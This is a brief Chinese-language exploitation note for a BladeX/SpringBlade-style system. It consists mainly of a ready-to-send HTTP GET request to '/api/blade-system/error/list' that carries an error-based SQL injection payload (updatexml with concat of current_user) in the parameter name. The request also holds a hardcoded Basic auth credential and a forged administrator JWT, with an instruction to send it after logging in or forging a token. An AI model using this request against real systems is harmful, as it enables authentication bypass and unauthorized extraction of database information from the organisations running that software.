## 利用

登录或伪造token后发包

```
GET /api/blade-system/error/list?updatexml(1,concat(0x7e,current_user,0x7e),1)=1 HTTP/1.1
Host: {target}
Connection: keep-alive
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
blade-auth: bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIn0.JOsWrAkblh7PFJFrr_cmuOQMrzStfwvee61sSVH4o6p401oAHpP284VkL0CyKnUX1MT8KnrCAOPRYBRbmfcdTg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko
Accept: application/json, text/plain, */*
User-Type: web_account
Tenant-Id: 000000
Accept-Encoding: gzip, deflate, br, zstd


```

<img src="./image/image-20241210092455439.png" alt="image-20241210092455439" style="zoom:50%;" />